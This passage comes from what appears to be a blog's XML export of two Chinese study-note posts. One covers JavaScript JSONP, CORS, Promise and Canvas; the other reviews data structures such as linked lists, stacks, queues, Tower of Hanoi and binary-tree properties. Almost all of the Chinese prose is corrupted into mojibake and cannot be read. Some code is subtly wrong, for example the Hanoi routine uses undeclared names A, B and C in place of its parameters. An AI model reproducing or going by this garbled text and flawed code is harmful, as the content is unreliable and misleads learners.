<p>å› æ­¤æˆ‘ä»¬éœ€è¦é¦–å…ˆåœ¨é¡µé¢ä¸­å‡†å¤‡å¥½å›è°ƒå‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function refreshPrice(data) &#123;</span><br><span class="line">    var p &#x3D; document.getElementById(&#39;test-jsonp&#39;);</span><br><span class="line">    p.innerHTML &#x3D; &#39;å½“å‰ä»·æ ¼ï¼š&#39; +</span><br><span class="line">        data[&#39;0000001&#39;].name +&#39;: &#39; + </span><br><span class="line">        data[&#39;0000001&#39;].price + &#39;ï¼›&#39; +</span><br><span class="line">        data[&#39;1399001&#39;].name + &#39;: &#39; +</span><br><span class="line">        data[&#39;1399001&#39;].price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“å‰ä»·æ ¼ï¼šä¸Šè¯æŒ‡æ•°: 3310.01ï¼›æ·±è¯æˆæŒ‡: 13637.883</p>
<p>åˆ·æ–°</p>
<p>æœ€åç”¨<code>getPrice()</code>å‡½æ•°è§¦å‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getPrice() &#123;</span><br><span class="line">    var</span><br><span class="line">        js &#x3D; document.createElement(&#39;script&#39;),</span><br><span class="line">        head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class="line">    js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;;</span><br><span class="line">    head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°±å®Œæˆäº†è·¨åŸŸåŠ è½½æ•°æ®ã€‚</p>
<p><strong>CORS</strong></p>
<p>CORSå…¨ç§°Cross-Origin Resource Sharing</p>
<p>æœ¬åŸŸï¼šOriginï¼Œä¹Ÿå°±æ˜¯æµè§ˆå™¨å½“å‰é¡µé¢çš„åŸŸã€‚</p>
<p>å¤–åŸŸï¼šæŒ‡å‘çš„è®¿é—®ç½‘é¡µ</p>
<p>å½“JavaScriptå‘å¤–åŸŸå‘èµ·è¯·æ±‚åï¼Œæµè§ˆå™¨æ”¶åˆ°å“åº”åï¼Œé¦–å…ˆæ£€æŸ¥<code>Access-Control-Allow-Origin</code>æ˜¯å¦åŒ…å«æœ¬åŸŸï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ­¤æ¬¡è·¨åŸŸè¯·æ±‚æˆåŠŸï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¯·æ±‚å¤±è´¥ï¼ŒJavaScriptå°†æ— æ³•è·å–åˆ°å“åº”çš„ä»»ä½•æ•°æ®ã€‚</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801154253687.png" alt="image-20200801154253687"></p>
<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>Promiseå¯¹è±¡å…ˆç»Ÿä¸€æ‰§è¡ŒAJAXé€»è¾‘ï¼Œä¸å…³å¿ƒå¦‚ä½•å¤„ç†ç»“æœï¼Œç„¶åï¼Œæ ¹æ®ç»“æœæ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œåœ¨å°†æ¥çš„æŸä¸ªæ—¶å€™è°ƒç”¨<code>success</code>å‡½æ•°æˆ–<code>fail</code>å‡½æ•°ã€‚</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801155554430.png" alt="image-20200801155554430"></p>
<p><strong>å¯¹Promiseå’ŒAJAXç†è§£è¿˜ä¸æ˜¯å¾ˆæ·±åˆ»ï¼Œå›å¤´ç»§ç»­çœ‹ã€‚</strong></p>
<h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>Canvasæ˜¯HTML5æ–°å¢çš„ç»„ä»¶ï¼Œå®ƒå°±åƒä¸€å—å¹•å¸ƒï¼Œå¯ä»¥ç”¨JavaScriptåœ¨ä¸Šé¢ç»˜åˆ¶å„ç§å›¾è¡¨ã€åŠ¨ç”»ç­‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTMLä»£ç  --&gt;</span><br><span class="line">&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt;</span><br><span class="line">    &lt;p&gt;ä½ çš„æµè§ˆå™¨ä¸æ”¯æŒCanvas&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;canvas&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>åé¢çš„jQueryï¼ŒNode.jså’ŒReactä¹‹åå†çœ‹ã€‚</strong></p>
]]></content>
      <categories>
        <category>å‰ç«¯</category>
      </categories>
      <tags>
        <tag>å‰ç«¯</tag>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®ç»“æ„å¤ä¹ </title>
    <url>/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="æ•°æ®ç»“æ„å¤ä¹ "><a href="#æ•°æ®ç»“æ„å¤ä¹ " class="headerlink" title="æ•°æ®ç»“æ„å¤ä¹ "></a>æ•°æ®ç»“æ„å¤ä¹ </h1><p>æ ¹æ®è€å¸ˆé‡ç‚¹ï¼Œå¤ä¹ æ•°æ®ç»“æ„ã€‚</p>
<h1 id="çº¿æ€§è¡¨"><a href="#çº¿æ€§è¡¨" class="headerlink" title="çº¿æ€§è¡¨"></a>çº¿æ€§è¡¨</h1><h2 id="å¾ªç¯é“¾è¡¨"><a href="#å¾ªç¯é“¾è¡¨" class="headerlink" title="å¾ªç¯é“¾è¡¨"></a>å¾ªç¯é“¾è¡¨</h2><p><strong>å¾ªç¯é“¾è¡¨çš„äº§ç”Ÿï¼šåœ¨å•é“¾è¡¨ä¸­ï¼Œï¼ˆ1ï¼‰åªçŸ¥é“ä¸€ä¸ªç»“ç‚¹ï¼Œæƒ³çŸ¥é“æ‰€æœ‰ç»“ç‚¹æ˜¯ä¸å¤ªè¡Œçš„ã€‚ï¼ˆ2ï¼‰å¦‚æœè¦æ‰¾ä¸€ä¸ªç»“ç‚¹çš„ç›´æ¥å‰é©±ç»“ç‚¹ï¼Œéœ€è¦ä»è¡¨ç«¯ä¸€ä¸ªä¸€ä¸ªç»“ç‚¹æŸ¥æ‰¾ï¼Œæ—¶é—´å¼€é”€åˆ°è¾¾äº†Oï¼ˆnï¼‰ã€‚</strong></p>
<h3 id="å¾ªç¯é“¾è¡¨çš„æ¦‚å¿µ"><a href="#å¾ªç¯é“¾è¡¨çš„æ¦‚å¿µ" class="headerlink" title="å¾ªç¯é“¾è¡¨çš„æ¦‚å¿µ"></a>å¾ªç¯é“¾è¡¨çš„æ¦‚å¿µ</h3><p>å°†å•é“¾è¡¨çš„é¦–å°¾ç›¸è¿ï¼Œä½¿ç»ˆç«¯ç»“ç‚¹çš„æŒ‡é’ˆåŸŸæŒ‡å‘å¤´ç»“ç‚¹ï¼Œæ„æˆ<strong>å•å‘å¾ªç¯é“¾è¡¨ã€‚</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630163907428.png" alt="image-20200630163907428"></p>
<p>å¾ªç¯é“¾è¡¨ä¸­å¯ä»¥å¸¦å¤´æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆã€‚</p>
<p>å¤´æŒ‡é’ˆï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164302095.png" alt="image-20200630164302095"></p>
<p>å°¾æŒ‡é’ˆï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164326659.png" alt="image-20200630164326659"></p>
<h3 id="å¾ªç¯é“¾è¡¨çš„æ’å…¥"><a href="#å¾ªç¯é“¾è¡¨çš„æ’å…¥" class="headerlink" title="å¾ªç¯é“¾è¡¨çš„æ’å…¥"></a>å¾ªç¯é“¾è¡¨çš„æ’å…¥</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164711122.png" alt="image-20200630164711122"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å…·ä½“æ“ä½œ</span></span><br><span class="line">s-&gt;link = p-&gt;link;</span><br><span class="line">p-&gt;link = s;</span><br></pre></td></tr></table></figure>
<h2 id="åŒå‘é“¾è¡¨"><a href="#åŒå‘é“¾è¡¨" class="headerlink" title="åŒå‘é“¾è¡¨"></a>åŒå‘é“¾è¡¨</h2><p><strong>åŒå‘é“¾è¡¨çš„äº§ç”Ÿï¼šè§£å†³å•é“¾è¡¨ä¸­çš„ï¼ˆ2ï¼‰</strong></p>
<h3 id="åŒå‘é“¾è¡¨çš„æ¦‚å¿µ"><a href="#åŒå‘é“¾è¡¨çš„æ¦‚å¿µ" class="headerlink" title="åŒå‘é“¾è¡¨çš„æ¦‚å¿µ"></a>åŒå‘é“¾è¡¨çš„æ¦‚å¿µ</h3><p>åŒå‘é“¾è¡¨ä¸­çš„æ¯ä¸ªç»“ç‚¹éƒ½æœ‰<strong>ä¸€ä¸ªå‰é©±æŒ‡é’ˆå’Œä¸€ä¸ªåç»§æŒ‡é’ˆå’Œæ•°æ®åŸŸ</strong>ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630170548596.png" alt="image-20200630170548596"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink;</span><br></pre></td></tr></table></figure>
<h3 id="åŒå‘é“¾è¡¨çš„æ’å…¥"><a href="#åŒå‘é“¾è¡¨çš„æ’å…¥" class="headerlink" title="åŒå‘é“¾è¡¨çš„æ’å…¥"></a>åŒå‘é“¾è¡¨çš„æ’å…¥</h3><p>åŒå‘é“¾è¡¨çš„æ’å…¥åˆ†ä¸º<strong>å‰é©±æ–¹å‘çš„æ’å…¥å’Œåç»§æ–¹å‘çš„æ’å…¥â€˜</strong>ã€‚</p>
<p><strong>åç»§:</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171322422.png" alt="image-20200630171322422"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å…·ä½“æ“ä½œ</span><br><span class="line">newnode-&gt;rlink &#x3D; current-&gt;rlink;</span><br><span class="line">current-&gt;rlink &#x3D; newnode;</span><br><span class="line">newnode-&gt;rlink-&gt;llink &#x3D; newnode;</span><br><span class="line">newnode-&gt;llink &#x3D; current;</span><br></pre></td></tr></table></figure>
<p><strong>å‰é©±ï¼ˆç›¸å½“äºåå‘çš„åç»§ï¼‰ï¼š</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171637079.png" alt="image-20200630171637079"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å…·ä½“æ“ä½œ</span><br><span class="line">newnode-&gt;llink &#x3D; current-&gt;llink;</span><br><span class="line">current-&gt;llink &#x3D; newnode;</span><br><span class="line">newnode-&gt;llink-&gt;rlink &#x3D; newnode;</span><br><span class="line">newnode-&gt;rlink &#x3D; current;</span><br></pre></td></tr></table></figure>
<h3 id="åŒå‘é“¾è¡¨çš„åˆ é™¤"><a href="#åŒå‘é“¾è¡¨çš„åˆ é™¤" class="headerlink" title="åŒå‘é“¾è¡¨çš„åˆ é™¤"></a>åŒå‘é“¾è¡¨çš„åˆ é™¤</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630173056989.png" alt="image-20200630173056989"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å…·ä½“æ“ä½œ</span><br><span class="line">current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;</span><br><span class="line">current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink;</span><br></pre></td></tr></table></figure>
<h1 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h1><p><strong>æ ˆçš„å®šä¹‰</strong></p>
<p>åªå…è®¸åœ¨ä¸€ç«¯æ’å…¥å’Œåˆ é™¤çš„çº¿æ€§è¡¨ã€‚<strong>ï¼ˆåè¿›å…ˆå‡ºï¼‰</strong></p>
<p><strong>æ ˆé¡¶ï¼šå…è®¸æ’å…¥å’Œåˆ é™¤çš„ä¸€ç«¯ã€‚</strong></p>
<p><strong>æ ˆåº•ï¼šä¸å…è®¸æ’å…¥å’Œåˆ é™¤çš„ä¸€ç«¯ã€‚</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630215456726.png" alt="image-20200630215456726"></p>
<h2 id="é¡ºåºæ ˆ"><a href="#é¡ºåºæ ˆ" class="headerlink" title="é¡ºåºæ ˆ"></a>é¡ºåºæ ˆ</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630220043153.png" alt="image-20200630220043153"></p>
<p>æ ˆé¡¶æŒ‡é’ˆtop=maxsize-1ï¼Œåˆ™è¡¨ç¤ºæ ˆæ»¡ã€‚</p>
<h3 id="åˆ—è½¦è°ƒåº¦é—®é¢˜"><a href="#åˆ—è½¦è°ƒåº¦é—®é¢˜" class="headerlink" title="åˆ—è½¦è°ƒåº¦é—®é¢˜"></a><strong>åˆ—è½¦è°ƒåº¦é—®é¢˜</strong></h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630221711583.png" alt="image-20200630221711583"></p>
<p>å¦‚ä¸Šå›¾æ‰€è¿°ï¼Œæœ‰å¤šå°‘ç§ä¸åŒçš„å‡ºæ ˆåºåˆ—ï¼Ÿ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)</span><br><span class="line">F(0)&#x3D;1</span><br><span class="line">F(1)&#x3D;F(0)*F(0)&#x3D;1</span><br><span class="line">F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2</span><br><span class="line">F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5</span><br><span class="line">F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14</span><br></pre></td></tr></table></figure>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630223541131.png" alt="image-20200630223541131"></p>
<p><strong>åœ¨1423åºåˆ—ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿå­åºåˆ—423ï¼Œå‘ç°2å¤¹åœ¨4å’Œ3ä¹‹é—´ï¼Œå³æœ€å¤§çš„æ•°å…ˆå‡ºæ ˆï¼Œæœ€å°çš„æ•°ä¸­é—´å‡ºæ ˆï¼Œä¸­é—´çš„æ•°æœ€åå‡ºæ ˆâ€”â€”è¿™æ— è®ºå¦‚ä½•ä¸å¯èƒ½å‡ºç°ï¼Œå› ä¸ºå®ƒè¿åæ ˆâ€œåè¿›å…ˆå‡ºâ€çš„ç‰¹ç‚¹ï¼›åŒæ ·2413åºåˆ—ä¸­1å¤¹åœ¨4å’Œ3ä¹‹é—´ï¼Œ3412åºåˆ—ä¸­1å¤¹åœ¨4å’Œ2ä¹‹é—´ï¼Œ4312åºåˆ—ä¸­1å¤¹åœ¨3å’Œ2ä¹‹é—´ï¼Œè¿™éƒ½è¿åLOFIè§„å¾‹ã€‚</strong></p>
<h2 id="é“¾å¼æ ˆ"><a href="#é“¾å¼æ ˆ" class="headerlink" title="é“¾å¼æ ˆ"></a>é“¾å¼æ ˆ</h2><p>ç”¨å•é“¾è¡¨æ¥è¡¨ç¤ºæ ˆï¼Œä¸ºé“¾å¼æ ˆã€‚</p>
<ul>
<li>é“¾å¼æ ˆæ— æ ˆæ»¡é—®é¢˜ã€‚</li>
<li><strong>é“¾å¼æ ˆçš„æ ˆé¡¶åœ¨é“¾å¤´</strong>ã€‚</li>
<li>æ’å…¥å’Œåˆ é™¤åœ¨æ ˆé¡¶æ‰§è¡Œã€‚</li>
</ul>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630224640113.png" alt="image-20200630224640113"></p>
<p><strong>*æ‹¬å·åŒ¹é…</strong></p>
<p><strong>*ä¸­ç¼€è¡¨è¾¾å¼è½¬æ¢æˆåç¼€è¡¨è¾¾å¼</strong></p>
<ol>
<li>é™¤å·¦æ‹¬å·å’Œå³æ‹¬å·å¤–ï¼ŒåŒä¸€æ“ä½œç¬¦æ ˆå†…ä¼˜å…ˆçº§å¤§äºæ ˆå¤–ä¼˜å…ˆçº§ã€‚</li>
<li>è‹¥æ ˆå¤–æ“ä½œç¬¦ä¼˜å…ˆçº§å¤§äºæ ˆå†…æ“ä½œç¬¦ï¼Œåˆ™æ ˆå¤–æ“ä½œç¬¦è¿›æ ˆï¼›å¦åˆ™ï¼Œå‡ºæ ˆã€‚</li>
<li><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630231145799.png" alt="image-20200630231145799"></li>
</ol>
<h2 id="æ ˆä¸é€’å½’"><a href="#æ ˆä¸é€’å½’" class="headerlink" title="æ ˆä¸é€’å½’"></a>æ ˆä¸é€’å½’</h2><ol>
<li>å®šä¹‰æ˜¯é€’å½’çš„ï¼ˆæ–æ³¢é‚£å¥‘æ•°åˆ—ï¼‰</li>
<li>æ•°æ®ç»“æ„æ˜¯é€’å½’çš„ï¼ˆæ ‘ï¼Œé“¾è¡¨ï¼‰</li>
<li>é—®é¢˜è§£æ³•æ˜¯é€’å½’çš„</li>
</ol>
<h3 id="æ±‰è¯ºå¡”é—®é¢˜"><a href="#æ±‰è¯ºå¡”é—®é¢˜" class="headerlink" title="æ±‰è¯ºå¡”é—®é¢˜"></a>æ±‰è¯ºå¡”é—®é¢˜</h3><ol>
<li>ç”¨ C æŸ±åšè¿‡æ¸¡ï¼Œå°† A æŸ±ä¸Šçš„ (n-1) ä¸ªç›˜å­ç§»åˆ° B æŸ±ä¸Šï¼›</li>
<li>å°† A æŸ±ä¸Šæœ€åä¸€ä¸ªç›˜å­ç›´æ¥ç§»åˆ° C æŸ±ä¸Šï¼›</li>
<li>ç”¨ A æŸ±åšè¿‡æ¸¡ï¼Œå°† B æŸ±ä¸Šçš„ (n-1) ä¸ªç›˜å­ç§»åˆ° C æŸ±ä¸Šã€‚</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701140602693.png" alt="image-20200701140602693"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hanoi</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">move</span>(n,A,C);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    Hanoi(n<span class="number">-1</span>,A,C,B);</span><br><span class="line">    <span class="built_in">move</span>(n,A,C);</span><br><span class="line">    Hanoi(n<span class="number">-1</span>,B,A,C);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> A,<span class="keyword">char</span> C)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"Move "</span>&lt;&lt; n &lt;&lt;<span class="string">"From "</span>&lt;&lt; A &lt;&lt;<span class="string">"To "</span>&lt;&lt; C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h1><p><strong>é˜Ÿåˆ—çš„å®šä¹‰</strong>ï¼š</p>
<p>åªå…è®¸åœ¨ä¸€ç«¯åˆ é™¤ï¼Œåœ¨å¦ä¸€ç«¯æ’å…¥çš„çº¿æ€§è¡¨ã€‚ï¼ˆ<strong>å…ˆè¿›å…ˆå‡º</strong>ï¼‰</p>
<p><strong>é˜Ÿå¤´</strong>ï¼šå…è®¸åˆ é™¤çš„=ä¸€ç«¯ã€‚</p>
<p><strong>é˜Ÿå°¾</strong>ï¼šå…è®¸æ’å…¥çš„ä¸€ç«¯ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701141927370.png" alt="image-20200701141927370"></p>
<h2 id="å¾ªç¯é˜Ÿåˆ—"><a href="#å¾ªç¯é˜Ÿåˆ—" class="headerlink" title="å¾ªç¯é˜Ÿåˆ—"></a>å¾ªç¯é˜Ÿåˆ—</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701142027568.png" alt="image-20200701142027568"></p>
<ol>
<li>é˜Ÿåˆ—åˆå§‹åŒ–ï¼š=front = rear = 0;</li>
<li>é˜Ÿå¤´æŒ‡é’ˆè¿›1:  front = (front+1) % maxSize;</li>
<li>é˜Ÿå°¾æŒ‡é’ˆè¿›1:  rear = (rear+1) % maxSize;</li>
<li>é˜Ÿç©ºæ¡ä»¶ï¼šfront == rear;</li>
<li>é˜Ÿæ»¡æ¡ä»¶ï¼š<strong>(rear+1) % maxSize == front</strong> ;</li>
<li>å¾ªç¯é˜Ÿåˆ—åªèƒ½å­˜æ”¾<strong>ï¼ˆmaxSize-1ï¼‰</strong>ä¸ªå…ƒç´ ï¼›</li>
<li>å¾ªç¯é˜Ÿåˆ—ä¸­å…ƒç´ çš„ä¸ªæ•°ä¸ºï¼š<strong>(rear-front+maxSize)%maxSize;</strong></li>
</ol>
<h2 id="é“¾å¼é˜Ÿåˆ—"><a href="#é“¾å¼é˜Ÿåˆ—" class="headerlink" title="é“¾å¼é˜Ÿåˆ—"></a>é“¾å¼é˜Ÿåˆ—</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701143456590.png" alt="image-20200701143456590"></p>
<ol>
<li>é˜Ÿå¤´åœ¨é“¾å¤´ï¼Œé˜Ÿå°¾åœ¨é“¾å°¾ã€‚</li>
<li>é˜Ÿç©ºä¸º front == NULL</li>
</ol>
<h1 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h1><p><strong>æ•°ç»„çš„å­˜å‚¨è¡¨ç¤ºï¼š</strong></p>
<p>è®¾ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å­˜å‚¨åœ°å€ä¸ºaï¼Œæ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å­˜å‚¨å¤§å°ä¸ºl</p>
<p>åœ¨ä¸€ç»´æ•°ç»„ä¸­ï¼š$LOC(i)=a+i*l$</p>
<p>åœ¨äºŒç»´æ•°ç»„ä¸­,æŒ‰ç…§è¡Œä¼˜å…ˆå­˜å‚¨ï¼Œæ¯ä¸€è¡Œæœ€å¤šå­˜å‚¨å…ƒç´ ä¸ºmä¸ªï¼š$LOC(j,k)=a+(j*m+k)l$</p>
<h1 id="æ•£åˆ—è¡¨"><a href="#æ•£åˆ—è¡¨" class="headerlink" title="æ•£åˆ—è¡¨"></a>æ•£åˆ—è¡¨</h1><h1 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h1><h2 id="æ ‘çš„åŸºæœ¬æ¦‚å¿µ"><a href="#æ ‘çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="æ ‘çš„åŸºæœ¬æ¦‚å¿µ"></a>æ ‘çš„åŸºæœ¬æ¦‚å¿µ</h2><p><strong>ç»“ç‚¹çš„å±‚æ¬¡</strong>ï¼šæ ¹èŠ‚ç‚¹åœ¨ç¬¬ä¸€å±‚ï¼Œå…¶ä»–ç±»æ¨ã€‚</p>
<p><strong>æ·±åº¦</strong>ï¼šæ ‘ä¸­è·ç¦»æ ¹ç»“ç‚¹æœ€è¿œçš„ç»“ç‚¹æ‰€åœ¨çš„å±‚æ¬¡å«åšæ ‘çš„æ·±åº¦ã€‚</p>
<p><strong>é«˜åº¦</strong>ï¼šé«˜åº¦ä¸æ·±åº¦æ•°å€¼ç›¸ç­‰ï¼Œä½†æ–¹å‘ä¸åŒã€‚æ ¹èŠ‚ç‚¹çš„é«˜åº¦å°±å«åšæ ‘çš„é«˜åº¦ã€‚</p>
<p><strong>ç»“ç‚¹çš„åº¦</strong>ï¼šç»“ç‚¹æ‰€æ‹¥æœ‰çš„å­æ ‘æ£µæ ‘ã€‚</p>
<p><strong>æ ‘çš„åº¦</strong>ï¼šæ ‘ä¸­ç»“ç‚¹çš„åº¦çš„æœ€å¤§å€¼ã€‚</p>
<h2 id="äºŒå‰æ ‘"><a href="#äºŒå‰æ ‘" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h2><h3 id="äºŒå‰æ ‘çš„å®šä¹‰"><a href="#äºŒå‰æ ‘çš„å®šä¹‰" class="headerlink" title="äºŒå‰æ ‘çš„å®šä¹‰"></a><strong>äºŒå‰æ ‘çš„å®šä¹‰</strong></h3><ol>
<li>æ¯ä¸ªç»“ç‚¹æœ€å¤šæœ‰ä¸¤æ£µå­æ ‘</li>
<li>å·¦å­æ ‘å’Œå³å­æ ‘ä¸å¯é¢ å€’</li>
</ol>
<p>äºŒå‰æ ‘çš„äº”ç§å½¢æ€ï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701171507765.png" alt="image-20200701171507765"></p>
<h3 id="äºŒå‰æ ‘çš„æ€§è´¨"><a href="#äºŒå‰æ ‘çš„æ€§è´¨" class="headerlink" title="äºŒå‰æ ‘çš„æ€§è´¨"></a>äºŒå‰æ ‘çš„æ€§è´¨</h3><ol>
<li><strong>äºŒå‰æ ‘çš„ç¬¬iå±‚æœ€å¤šæœ‰$2^{i-1}$ä¸ªç»“ç‚¹</strong></li>
<li><strong>æ·±åº¦ä¸ºkçš„äºŒå‰æ ‘æœ€å°‘æœ‰kä¸ªç»“ç‚¹ï¼Œæœ€å¤šæœ‰$2^k-1$ä¸ªç»“ç‚¹</strong></li>
<li>å¯¹ä»»ä½•ä¸€æ£µäºŒå‰æ ‘ï¼Œå¦‚æœå…¶å¶ç»“ç‚¹æœ‰ n0 ä¸ª, åº¦ä¸º 2 çš„éå¶ç»“ç‚¹æœ‰ n2 ä¸ª,   åˆ™æœ‰<strong>n0ï¼n2ï¼‹1</strong></li>
<li>å…·æœ‰ n (nâ‰¥0) ä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ä¸º <strong>$\lceil log2(n+1)\rceil$</strong></li>
<li>å¦‚å°†ä¸€æ£µæœ‰nä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘è‡ªé¡¶å‘ä¸‹ï¼ŒåŒä¸€å±‚è‡ªå·¦å‘å³è¿ç»­ç»™ç»“ç‚¹ç¼–å·1, 2, â€¦, nï¼Œåˆ™æœ‰ä»¥ä¸‹å…³ç³»ï¼š<br>è‹¥i = 1, åˆ™ i æ— åŒäº²<br><strong>è‹¥i &gt; 1, åˆ™ i çš„åŒäº²ä¸º$\lfloor iï¼2\rfloor$</strong><br><strong>i çš„å·¦å­å¥³ä¸º 2 <em>i(å¦‚æœiæœ‰å·¦å­å¥³çš„è¯)ï¼Œ                             i çš„å³å­å¥³ä¸º2 </em>i+1 (å¦‚æœiæœ‰å³å­å¥³çš„è¯)</strong><br>è‹¥ i ä¸ºå¥‡æ•°, ä¸”i != 1, åˆ™å…¶å·¦å…„å¼Ÿä¸ºi-1,<br>è‹¥ i ä¸ºå¶æ•°, ä¸”i != 1, åˆ™å…¶å³å…„å¼Ÿä¸ºi+1</li>
</ol>
